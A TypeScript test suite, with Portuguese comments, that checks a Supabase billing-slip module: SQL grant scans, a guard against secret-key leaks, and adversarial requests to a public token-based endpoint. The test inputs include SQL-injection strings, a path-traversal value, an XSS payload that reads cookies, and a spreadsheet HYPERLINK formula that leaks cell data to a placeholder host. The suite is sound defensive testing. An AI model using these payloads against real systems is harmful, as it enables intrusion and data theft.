// ============================================================================
// 07_boletos.spec.ts — Portão adversarial da superfície NOVA (ETAPA 10 · Boletos)
//
// A ETAPA 10 aumenta as três superfícies que a RLS não alcança:
//   (1) views novas → 6 `v_boletos_*`/`v_ciclos_*` (security_invoker + anon fora);
//   (2) funções expostas como RPC → 4 `fn_*` de operação (anon fora, 42501 ao papel errado);
//   (3) endpoint público com service_role → Edge Function `receber-dados-boleto`,
//       que escreve `respostas_boleto` sem login, a partir de um token na URL.
//
// DIVISÃO POR ALVO (como 05 e 06): a varredura estática roda em qualquer lugar; o que
// ESCREVE ou consome recurso roda só no bench, atrás de `exigirBench()`. O SQL 33 não está
// em produção, então o bloco de bench não existe lá.
// ============================================================================
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { readFileSync, readdirSync, statSync, existsSync } from "node:fs";
import path from "node:path";
import type { SupabaseClient } from "@supabase/supabase-js";
import { clienteAnon, clienteServico, ehProducao, exigirBench, loginComo } from "../rls/helpers";
import { boletosDoCiclo, criarCicloESemear, limparMassaPossivel, semearMassa, type Massa } from "../rls/fixtures/boletosDemo";
import { gerarCsvEmails } from "../../src/features/boletos/csvEmails";

const bench = ehProducao() ? describe.skip : describe;

const RAIZ = path.resolve(__dirname, "../..");
const SQL33 = readFileSync(path.join(RAIZ, "sql/33_boletos_10_00.sql"), "utf8");
const FUNCAO_TS = readFileSync(path.join(RAIZ, "supabase/functions/receber-dados-boleto/index.ts"), "utf8");

function arquivos(dir: string, exts: string[]): string[] {
  if (!existsSync(dir)) return [];
  return readdirSync(dir).flatMap((n) => {
    const p = path.join(dir, n);
    return statSync(p).isDirectory() ? arquivos(p, exts) : exts.some((e) => p.endsWith(e)) ? [p] : [];
  });
}

// ============================================================================
// (1)(2) Varredura estática do SQL 33 — o que a RLS não olha
// ============================================================================
describe("V1 — views do SQL 33 (varredura estática)", () => {
  const views = [...SQL33.matchAll(/create or replace view (\w+)\s+with \(security_invoker = on\)/g)].map((m) => m[1]);
  const todas = [...SQL33.matchAll(/create (?:or replace )?view (\w+)/g)].map((m) => m[1]);

  it("toda view criada declara security_invoker = on (create or replace que esqueça devolve a view ao dono)", () => {
    expect(todas.length).toBe(6);
    expect(views.sort()).toEqual([...todas].sort());
  });

  it("anon é revogado de todas as views e nenhum GRANT vai para anon/public", () => {
    for (const v of todas) expect(SQL33, v).toMatch(new RegExp(`revoke all on[^;]*\\b${v}\\b[^;]*from anon`));
    expect(SQL33).not.toMatch(/grant [^;]*\bto\b[^;]*\b(anon|public)\b/i);
  });

  it("as tabelas novas revogam tudo de anon e authenticated antes dos GRANTs pontuais", () => {
    const bloco = SQL33.match(/revoke all on ([^;]*?)\s+from anon, authenticated;/s)?.[1] ?? "";
    for (const t of ["ciclos_boleto", "ciclo_convencoes", "caixas_boleto", "tokens_boleto", "ciclo_caixas", "boletos", "respostas_boleto", "tentativas_boleto"]) {
      expect(bloco, t).toContain(t);
    }
  });
});

describe("V2 — funções do SQL 33 (varredura estática)", () => {
  // [trecho, nome, _, corpo]: o corpo vai até o próximo alter/revoke/grant/create
  const defs = SQL33.split(/create or replace function /).slice(1).map((c) => {
    const nome = c.match(/^(\w+)\(/)![1];
    const corpo = c.split(/\n(?:alter function|revoke|grant|create or replace function)\b/)[0];
    return [c, nome, "", corpo] as const;
  });

  it("toda função security definer fixa o search_path", () => {
    expect(defs.length).toBeGreaterThan(8);
    for (const d of defs) {
      if (/security definer/i.test(d[3])) expect(d[3], d[1]).toMatch(/set search_path/i);
    }
  });

  it("as 4 RPCs só são executáveis por authenticated; as funções de trigger por ninguém", () => {
    for (const f of ["fn_semear_ciclo_boleto", "fn_recalcular_valores_ciclo_boleto", "fn_reemitir_token_boleto", "fn_renovar_token_boleto"]) {
      expect(SQL33, f).toMatch(new RegExp(`revoke execute on function ${f}\\(uuid\\)\\s+from public, anon`));
      expect(SQL33, f).toMatch(new RegExp(`grant\\s+execute on function ${f}\\(uuid\\)\\s+to authenticated`));
    }
    for (const f of ["fn_caixa_boleto_guard", "fn_boleto_valor", "fn_boleto_transicao", "fn_resposta_valida", "fn_resposta_aplica", "fn_resposta_imutavel"]) {
      expect(SQL33, f).toMatch(new RegExp(`revoke execute on function ${f}\\(\\)\\s+from public, anon, authenticated`));
    }
  });

  it("as 4 RPCs checam o papel DENTRO (fn_eh), porque security definer ignora a RLS", () => {
    for (const f of ["fn_semear_ciclo_boleto", "fn_recalcular_valores_ciclo_boleto", "fn_reemitir_token_boleto", "fn_renovar_token_boleto"]) {
      const d = defs.find((x) => x[1] === f);
      expect(d, f).toBeDefined();
      expect(d![3], f).toMatch(/fn_eh\('admin', 'secretaria'\)/);
    }
  });
});

// ============================================================================
// (3) Código: nada de service_role no bundle, nada de HTML injetado
// ============================================================================
describe("V3 — service_role e renderização (varredura estática)", () => {
  it("service_role só existe na Edge Function, lida do ambiente do Deno", () => {
    expect(FUNCAO_TS).toMatch(/Deno\.env\.get\("SUPABASE_SERVICE_ROLE_KEY"\)/);
    const chave = process.env.SUPABASE_SERVICE_ROLE_KEY;
    for (const f of arquivos(path.join(RAIZ, "src"), [".ts", ".tsx"])) {
      const t = readFileSync(f, "utf8");
      if (chave) expect(t.includes(chave), f).toBe(false);
    }
    for (const f of arquivos(path.join(RAIZ, "dist"), [".js", ".html"])) {
      if (chave) expect(readFileSync(f, "utf8").includes(chave), f).toBe(false);
    }
  });

  it("o módulo não injeta HTML: nada de dangerouslySetInnerHTML, innerHTML ou eval", () => {
    for (const f of arquivos(path.join(RAIZ, "src/features/boletos"), [".ts", ".tsx"])) {
      expect(readFileSync(f, "utf8"), f).not.toMatch(/dangerouslySetInnerHTML|\.innerHTML|\beval\(|new Function\(/);
    }
  });

  it("a página pública não chama supabase-js (só a função, com apikey anon)", () => {
    for (const f of ["apiPublica.ts", "ResponderPage.tsx"]) {
      const t = readFileSync(path.join(RAIZ, "src/features/boletos", f), "utf8");
      expect(t, f).not.toMatch(/from\s+["']@\/lib\/supabase["']|createClient/);
    }
  });

  it("a função nunca devolve valor, valor-base nem token em nenhuma resposta", () => {
    const respostas = [...FUNCAO_TS.matchAll(/json\(req,\s*\{([^}]*)\}/g)].map((m) => m[1]).join("\n");
    expect(respostas).not.toMatch(/\bvalor\b|valor_base|token_expira_em|\btoken\b/);
  });
});

describe("V4 — CSV com fórmula (lista de e-mails para a Brevo)", () => {
  it("nome começando em =, +, -, @ ou TAB sai neutralizado com apóstrofo", () => {
    for (const nome of ['=HYPERLINK("http://x/?d="&A1,"clique")', "+1+1", "-2+3", "@SUM(A1)", "\tcmd"]) {
      const csv = gerarCsvEmails([{ nome, email: "a@b.co", link: "https://x/y", convencoes: "A", nCnpj: 1 }]);
      expect(csv).toContain(`"'${nome.replace(/"/g, '""')}"`);
    }
  });
});

// ============================================================================
// Edge Function pública — só no bench
// ============================================================================
const FN = `${process.env.VITE_SUPABASE_URL}/functions/v1/receber-dados-boleto`;
const ANON_KEY = process.env.VITE_SUPABASE_ANON_KEY as string;
const MSG_INVALIDO = "Link inválido. Fale com a secretaria do sindicato para receber um novo.";

type Resp = { ok?: boolean; erro?: string; gravadas?: number; recusadas?: { boleto_id: string; motivo: string }[]; ciclos?: any[] };

/** Nunca `.json()` direto: um caminho de erro pode vir da borda (WAF) em HTML. */
async function chamar(url: string, init: RequestInit = {}) {
  const r = await fetch(url, { ...init, headers: { apikey: ANON_KEY, ...(init.headers ?? {}) } });
  const texto = await r.text();
  let corpo: Resp | null = null;
  try {
    corpo = JSON.parse(texto) as Resp;
  } catch {
    corpo = null;
  }
  return { http: r.status, corpo, texto, tipo: r.headers.get("content-type") ?? "", cabecalhos: r.headers };
}
const ler = (token: string) => chamar(`${FN}?token=${encodeURIComponent(token)}`);
const postar = (corpo: unknown) =>
  chamar(FN, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(corpo) });
const uuidAleatorio = () => crypto.randomUUID();

bench("Edge Function receber-dados-boleto — endpoint público com service_role", () => {
  let massa: Massa;
  let admin: SupabaseClient;
  let cicloId = "";
  let bol: Record<string, string> = {};
  let tkUm = "";
  let tkTres = "";
  let b1 = "";
  let b2 = "";
  let b3 = "";

  const respostasDe = async (...ids: string[]) =>
    ((await clienteServico().from("respostas_boleto").select("*").in("boleto_id", ids)).data ?? []) as Record<string, any>[];

  beforeAll(async () => {
    exigirBench("07_boletos: semear massa");
    admin = (await loginComo("admin")).client;
    massa = await semearMassa();
    const r = await criarCicloESemear(admin, massa, "taf", [massa.convA, massa.convB]);
    cicloId = r.cicloId;
    bol = await boletosDoCiclo(cicloId);
    [b1, b2, b3] = [bol[massa.estab.e1], bol[massa.estab.e2], bol[massa.estab.e3]];
    const s = clienteServico();
    const t = await s.from("caixas_boleto").select("id, email, tokens_boleto(token)").in("email", [massa.emailUm, massa.emailTres]);
    for (const cx of t.data ?? []) {
      const tk = (cx.tokens_boleto as any)?.token ?? (cx.tokens_boleto as any)?.[0]?.token;
      if (cx.email === massa.emailUm) tkUm = tk;
      else tkTres = tk;
    }
    if (!tkUm || !tkTres) throw new Error("massa sem tokens");
  }, 120_000);

  afterAll(async () => {
    await limparMassaPossivel(massa ?? null, cicloId ? [cicloId] : []);
  }, 60_000);

  // ---------------------------------------------------------------- token
  describe("token: a função não é oráculo de existência", () => {
    it("sem token, lixo, SQL no token, UUID inexistente e UUID quase certo: a MESMA resposta", async () => {
      const quaseCerto = tkUm.slice(0, -1) + (tkUm.endsWith("0") ? "1" : "0");
      const entradas = ["", "abc", "' or '1'='1", "1; drop table boletos; --", "../../etc/passwd", uuidAleatorio(), quaseCerto, "%00", "A".repeat(5000)];
      for (const e of entradas) {
        const r = await (e === "" ? chamar(FN) : ler(e));
        const rotulo = JSON.stringify(e.slice(0, 20));
        // A borda (WAF) pode barrar texto com cara de SQL/traversal antes da função: 4xx sem dado.
        if (r.http !== 200) {
          expect(r.http, rotulo).toBeGreaterThanOrEqual(400);
          expect(r.http, rotulo).toBeLessThan(500);
          expect(r.corpo?.ok, rotulo).not.toBe(true);
          continue;
        }
        expect(r.corpo, rotulo).toEqual({ ok: false, erro: MSG_INVALIDO });
      }
    });

    it("token de 5000 caracteres nunca é gravado inteiro na tabela de tentativas (≤200)", async () => {
      const lixo = "Z".repeat(1000) + "Y".repeat(4000);
      const r = await ler(lixo);
      if (r.http === 200) {
        expect(r.corpo).toEqual({ ok: false, erro: MSG_INVALIDO });
        const { data } = await clienteServico().from("tentativas_boleto").select("token_alvo").like("token_alvo", "ZZZZZZZZZZ%").order("ocorrida_em", { ascending: false }).limit(1);
        expect(data?.[0]).toBeDefined();
        expect(data![0].token_alvo.length).toBeLessThanOrEqual(200);
      } else {
        expect(r.http).toBeGreaterThanOrEqual(400); // barrado na borda por tamanho de URL
      }
    });

    it("token expirado dá a mesma resposta de token inexistente, e voltar a validade o reativa (sem trocar o token)", async () => {
      const s = clienteServico();
      await s.from("tokens_boleto").update({ token_expira_em: new Date(Date.now() - 86400_000).toISOString() }).eq("token", tkTres);
      const exp = await ler(tkTres);
      expect(exp.corpo).toEqual({ ok: false, erro: MSG_INVALIDO });
      const post = await postar({ token: tkTres, respostas: [{ boleto_id: b3, quantidade: 1, cnpj_confirmado: true }] });
      expect(post.corpo).toEqual({ ok: false, erro: MSG_INVALIDO });
      expect(await respostasDe(b3)).toHaveLength(0);
      await s.from("tokens_boleto").update({ token_expira_em: new Date(Date.now() + 700 * 86400_000).toISOString() }).eq("token", tkTres);
      expect((await ler(tkTres)).corpo?.ok).toBe(true);
    });

    it("freio: 5 falhas no MESMO token travam aquele token (GET e POST); outro token segue livre", async () => {
      const alvo = uuidAleatorio();
      for (let i = 0; i < 5; i++) expect((await ler(alvo)).corpo?.erro).toBe(MSG_INVALIDO);
      const travado = await ler(alvo);
      expect(travado.corpo?.ok).toBe(false);
      expect(travado.corpo?.erro).toMatch(/Muitas tentativas/);
      const travadoPost = await postar({ token: alvo, respostas: [{ boleto_id: b1, quantidade: 1, cnpj_confirmado: true }] });
      expect(travadoPost.corpo?.erro).toMatch(/Muitas tentativas/);
      expect((await ler(tkUm)).corpo?.ok).toBe(true);
    });

    it("token VÁLIDO nunca é freado, por mais respostas recusadas que mande (dado ruim não conta)", async () => {
      for (let i = 0; i < 7; i++) {
        const r = await postar({ token: tkUm, respostas: [{ boleto_id: b1, quantidade: -1, cnpj_confirmado: true }] });
        expect(r.corpo?.ok, `tentativa ${i}`).toBe(true);
        expect(r.corpo?.gravadas).toBe(0);
        expect(r.corpo?.recusadas).toHaveLength(1);
      }
      expect((await ler(tkUm)).corpo?.ok).toBe(true);
    });
  });

  // ---------------------------------------------------------------- leitura
  describe("leitura: só os CNPJs da própria caixa, sem valor nem token", () => {
    it("a caixa 'um' vê e1 e e2; nada de e3; sem 'valor', 'token' ou JWT no corpo", async () => {
      const r = await ler(tkUm);
      expect(r.http).toBe(200);
      expect(r.tipo).toMatch(/application\/json/);
      const itens = (r.corpo?.ciclos ?? []).flatMap((c: any) => c.itens);
      expect(itens.map((i: any) => i.boleto_id).sort()).toEqual([b1, b2].sort());
      expect(r.texto).not.toContain(massa.cnpj.e3);
      expect(r.texto).not.toContain(tkTres);
      expect(r.texto).not.toContain(tkUm);
      expect(r.texto).not.toMatch(/"valor|valor_base|eyJ/);
      expect(itens.every((i: any) => i.editavel === true)).toBe(true);
    });

    it("CORS: origem estranha nunca é refletida; OPTIONS responde 204", async () => {
      const r = await chamar(`${FN}?token=${tkUm}`, { headers: { Origin: "https://evil.example" } });
      expect(r.cabecalhos.get("access-control-allow-origin")).not.toBe("https://evil.example");
      const o = await fetch(FN, { method: "OPTIONS", headers: { Origin: "https://crm.sindcompassos.org", apikey: ANON_KEY } });
      expect(o.status).toBe(204);
    });

    it("métodos além de GET/POST: 405", async () => {
      for (const m of ["PUT", "DELETE", "PATCH"]) {
        const r = await chamar(`${FN}?token=${tkUm}`, { method: m });
        expect(r.http, m).toBe(405);
      }
    });
  });

  // ---------------------------------------------------------------- escrita: o que NÃO pode passar
  describe("escrita: pertencimento e validação", () => {
    it("boleto de OUTRA caixa e boleto inexistente recebem a MESMA recusa, e nada é gravado", async () => {
      const outra = await postar({ token: tkUm, respostas: [{ boleto_id: b3, quantidade: 9, cnpj_confirmado: true }] });
      const nada = await postar({ token: tkUm, respostas: [{ boleto_id: uuidAleatorio(), quantidade: 9, cnpj_confirmado: true }] });
      expect(outra.corpo?.gravadas).toBe(0);
      expect(nada.corpo?.gravadas).toBe(0);
      expect(outra.corpo?.recusadas?.[0].motivo).toBe(nada.corpo?.recusadas?.[0].motivo);
      expect(await respostasDe(b3)).toHaveLength(0);
    });

    it("quantidade fora de 0..99999, fracionária, texto ou nula: recusada, sem gravar", async () => {
      const ruins: unknown[] = [-1, 100000, 1.5, "10", null, true, [], {}, 1e21];
      const r = await postar({ token: tkUm, respostas: ruins.map((q) => ({ boleto_id: b1, quantidade: q, cnpj_confirmado: true })) });
      // o mesmo boleto_id repetido: itens inválidos não entram no mapa, então todos viram recusa
      expect(r.corpo?.gravadas).toBe(0);
      expect(r.corpo?.recusadas).toHaveLength(ruins.length);
      expect(await respostasDe(b1, b2)).toHaveLength(0);
    });

    it("CNPJ incorreto sem observação, observação de 301 caracteres, flag em texto, boleto_id que não é UUID, itens não-objeto", async () => {
      const r = await postar({
        token: tkUm,
        respostas: [
          { boleto_id: b1, quantidade: 1, cnpj_confirmado: false },
          { boleto_id: b1, quantidade: 1, cnpj_confirmado: false, cnpj_incorreto_obs: "   " },
          { boleto_id: b1, quantidade: 1, cnpj_confirmado: false, cnpj_incorreto_obs: "x".repeat(301) },
          { boleto_id: b1, quantidade: 1, cnpj_confirmado: "false" },
          { boleto_id: b1, quantidade: 1, cnpj_confirmado: true, cnpj_incorreto_obs: 42 },
          { boleto_id: "nao-e-uuid", quantidade: 1, cnpj_confirmado: true },
          null,
          5,
          "x",
          [],
        ],
      });
      expect(r.http).toBe(200);
      expect(r.corpo?.gravadas).toBe(0);
      expect(r.corpo?.recusadas).toHaveLength(10);
      expect(await respostasDe(b1)).toHaveLength(0);
    });

    it("boleto_id com cara de SQL: recusado pela função ou barrado na borda, nunca aceito", async () => {
      const r = await postar({ token: tkUm, respostas: [{ boleto_id: "' or 1=1 --", quantidade: 1, cnpj_confirmado: true }] });
      if (r.http === 200) {
        expect(r.corpo?.gravadas).toBe(0);
        expect(r.corpo?.recusadas).toHaveLength(1);
      } else {
        expect(r.http).toBeGreaterThanOrEqual(400);
        expect(r.http).toBeLessThan(500);
      }
      expect(await respostasDe(b1, b2)).toHaveLength(0);
    });

    it("limites do envelope: 201 respostas, lista vazia, JSON quebrado e corpo acima de 128 KB viram {ok:false}, não erro 500", async () => {
      const item = { boleto_id: b1, quantidade: 1, cnpj_confirmado: true };
      const casos: unknown[] = [
        { token: tkUm, respostas: Array.from({ length: 201 }, () => item) },
        { token: tkUm, respostas: [] },
        { token: tkUm },
        { token: tkUm, respostas: "x" },
        { token: tkUm, respostas: [{ ...item, cnpj_incorreto_obs: "y".repeat(140_000) }] },
      ];
      for (const [i, corpo] of casos.entries()) {
        const r = await postar(corpo);
        expect(r.http, `caso ${i}`).toBe(200);
        expect(r.corpo?.ok, `caso ${i}`).toBe(false);
      }
      const quebrado = await chamar(FN, { method: "POST", headers: { "Content-Type": "application/json" }, body: `{"token":"${tkUm}","respostas":[` });
      expect(quebrado.http).toBe(200);
      expect(quebrado.corpo?.ok).toBe(false);
      expect(await respostasDe(b1, b2)).toHaveLength(0);
    });

    it("exatamente 200 respostas é aceito (limite não é off-by-one); as que não são da caixa são recusadas uma a uma", async () => {
      const r = await postar({
        token: tkUm,
        respostas: Array.from({ length: 200 }, () => ({ boleto_id: uuidAleatorio(), quantidade: 1, cnpj_confirmado: true })),
      });
      expect(r.corpo?.ok).toBe(true);
      expect(r.corpo?.gravadas).toBe(0);
      expect(r.corpo?.recusadas).toHaveLength(200);
    });
  });

  // ---------------------------------------------------------------- escrita: o caminho feliz e seus efeitos
  describe("escrita: resposta válida", () => {
    it("grava origem 'link', o trigger calcula 10 × 12,50 e o boleto vai para 'fazer'", async () => {
      const r = await postar({ token: tkUm, respostas: [{ boleto_id: b1, quantidade: 10, cnpj_confirmado: true }] });
      expect(r.corpo).toMatchObject({ ok: true, gravadas: 1, recusadas: [] });
      const rs = await respostasDe(b1);
      expect(rs).toHaveLength(1);
      expect(rs[0]).toMatchObject({ origem: "link", quantidade: 10, cnpj_confirmado: true, registrada_por: null });
      const b = (await clienteServico().from("boletos").select("*").eq("id", b1).single()).data as Record<string, any>;
      expect(b.estado).toBe("fazer");
      expect(Number(b.valor)).toBe(125);
    });

    it("o cliente não escolhe valor, estado, origem nem registrada_por: campos extras são ignorados", async () => {
      const r = await postar({
        token: tkUm,
        respostas: [{ boleto_id: b2, quantidade: 2, cnpj_confirmado: true, valor: 1, estado: "pago", origem: "manual", registrada_por: massa.convA }],
      });
      expect(r.corpo?.gravadas).toBe(1);
      const rs = await respostasDe(b2);
      expect(rs[0]).toMatchObject({ origem: "link", registrada_por: null });
      const b = (await clienteServico().from("boletos").select("*").eq("id", b2).single()).data as Record<string, any>;
      expect(b.estado).toBe("fazer");
      expect(Number(b.valor)).toBe(25);
    });

    it("mesmo boleto repetido no mesmo envio: vale o último e grava UMA linha", async () => {
      const antes = (await respostasDe(b2)).length;
      const r = await postar({
        token: tkUm,
        respostas: [
          { boleto_id: b2, quantidade: 3, cnpj_confirmado: true },
          { boleto_id: b2, quantidade: 4, cnpj_confirmado: true },
        ],
      });
      expect(r.corpo?.gravadas).toBe(1);
      expect((await respostasDe(b2)).length).toBe(antes + 1);
      const b = (await clienteServico().from("boletos").select("quantidade").eq("id", b2).single()).data as Record<string, any>;
      expect(b.quantidade).toBe(4);
    });

    it("XSS na observação: guardado como texto inerte e devolvido como JSON (nunca como HTML)", async () => {
      const xss = `<img src=x onerror=alert(1)></td><script>alert(document.cookie)</script>"'`;
      const r = await postar({ token: tkUm, respostas: [{ boleto_id: b1, quantidade: 11, cnpj_confirmado: false, cnpj_incorreto_obs: xss }] });
      expect(r.corpo?.gravadas).toBe(1);
      const g = await ler(tkUm);
      expect(g.tipo).toMatch(/application\/json/);
      expect(g.tipo).not.toMatch(/html/);
      const item = (g.corpo?.ciclos ?? []).flatMap((c: any) => c.itens).find((i: any) => i.boleto_id === b1);
      expect(item.cnpj_incorreto_obs).toBe(xss);
      expect(item.cnpj_confirmado).toBe(false);
    });

    it("a leitura devolve a última resposta do boleto (quantidade e flag), sem expor o valor", async () => {
      const g = await ler(tkUm);
      const item = (g.corpo?.ciclos ?? []).flatMap((c: any) => c.itens).find((i: any) => i.boleto_id === b1);
      expect(item.quantidade).toBe(11);
      expect(g.texto).not.toMatch(/"valor/);
    });
  });

  // ---------------------------------------------------------------- estado do boleto e do ciclo
  describe("depois do boleto feito ou do ciclo encerrado, o link não escreve mais", () => {
    it("boleto em 'enviar': a leitura marca editavel=false e a gravação é recusada com a mensagem do trigger", async () => {
      expect((await admin.from("boletos").update({ estado: "enviar" }).eq("id", b1)).error).toBeNull();
      const g = await ler(tkUm);
      const item = (g.corpo?.ciclos ?? []).flatMap((c: any) => c.itens).find((i: any) => i.boleto_id === b1);
      expect(item.editavel).toBe(false);
      const antes = (await respostasDe(b1)).length;
      const r = await postar({ token: tkUm, respostas: [{ boleto_id: b1, quantidade: 99, cnpj_confirmado: true }] });
      expect(r.corpo?.gravadas).toBe(0);
      expect(r.corpo?.recusadas?.[0].motivo).toBeTruthy();
      expect(r.texto).not.toMatch(/violates|constraint|pg_|SQLSTATE|stack/i);
      expect((await respostasDe(b1)).length).toBe(antes);
    });

    it("ciclo encerrado: o token continua valendo (permanente), mas não lista nem aceita nada", async () => {
      expect((await admin.from("ciclos_boleto").update({ encerrado_em: new Date().toISOString() }).eq("id", cicloId)).error).toBeNull();
      const g = await ler(tkUm);
      expect(g.corpo).toMatchObject({ ok: true, ciclos: [] });
      const r = await postar({ token: tkUm, respostas: [{ boleto_id: b2, quantidade: 8, cnpj_confirmado: true }] });
      expect(r.corpo?.gravadas).toBe(0);
      expect(r.corpo?.recusadas).toHaveLength(1);
    });

    it("trocar o token mata o link antigo imediatamente", async () => {
      const novoCiclo = await criarCicloESemear(admin, massa, "ca", [massa.convA], `DEMO — BOL CA ${massa.sufixo}`);
      const cx = await clienteServico().from("caixas_boleto").select("id").eq("email", massa.emailUm).single();
      expect((await admin.rpc("fn_reemitir_token_boleto", { p_caixa: cx.data!.id })).error).toBeNull();
      const velho = await ler(tkUm);
      expect(velho.corpo).toEqual({ ok: false, erro: MSG_INVALIDO });
      await clienteServico().from("boletos").delete().eq("ciclo_id", novoCiclo.cicloId);
      await clienteServico().from("ciclo_caixas").delete().eq("ciclo_id", novoCiclo.cicloId);
      await clienteServico().from("ciclo_convencoes").delete().eq("ciclo_id", novoCiclo.cicloId);
      await clienteServico().from("ciclos_boleto").delete().eq("id", novoCiclo.cicloId);
    });
  });

  // ---------------------------------------------------------------- por fora da função
  describe("por fora da função: o anônimo não escreve nada pelo PostgREST", () => {
    it("INSERT/UPDATE direto de anon em respostas, boletos e tentativas: 42501", async () => {
      const a = clienteAnon();
      const ins = await a.from("respostas_boleto").insert({ boleto_id: b3, quantidade: 1, origem: "link" });
      expect(ins.error?.code).toBe("42501");
      const upd = await a.from("boletos").update({ estado: "pago" }).eq("id", b3);
      expect(upd.error?.code).toBe("42501");
      const tent = await a.from("tentativas_boleto").insert({ token_alvo: "x", sucesso: true });
      expect(tent.error?.code).toBe("42501");
      expect(await respostasDe(b3)).toHaveLength(0);
    });

    it("limpar as tentativas para zerar o freio não é possível a quem está logado", async () => {
      const { error } = await admin.from("tentativas_boleto").delete().neq("id", 0);
      expect(error?.code).toBe("42501");
    });
  });
});
